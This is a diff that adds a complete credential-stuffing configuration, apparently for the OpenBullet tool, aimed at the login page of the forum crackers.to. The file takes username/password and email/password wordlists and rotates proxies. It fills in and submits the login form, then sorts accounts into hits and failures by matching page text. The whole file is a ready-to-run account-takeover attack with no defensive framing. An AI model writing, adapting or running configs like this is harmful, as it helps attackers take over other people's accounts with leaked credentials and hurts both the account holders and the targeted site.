@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "Crackers.to",
+  "SuggestedBots": 5,
+  "LastModified": "2018-09-09T22:14:36.2151373+00:00",
+  "AdditionalInfo": "",
+  "Author": "Dreamzje",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+BROWSERACTION Open "" 
+NAVIGATE "https://crackers.to/member.php" 60 
+FUNCTION Delay "10000" -> VAR "delay" 
+NAVIGATE "https://crackers.to/member.php?action=login" 60 
+ELEMENTACTION Name "username" 
+  SendKeys "<USER>" -> VAR "" 
+ELEMENTACTION Name "password" 
+  SendKeys "<PASS>" -> VAR "" 
+ELEMENTACTION Name "submit" 
+  Click "" -> VAR "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "You have entered an invalid username/password combination." 
+  KEYCHAIN Success AND 
+    KEY "> Messages <" 
+    KEY "> Logout<" 
+BROWSERACTION ClearCookies "" 
+BROWSERACTION Close "" 
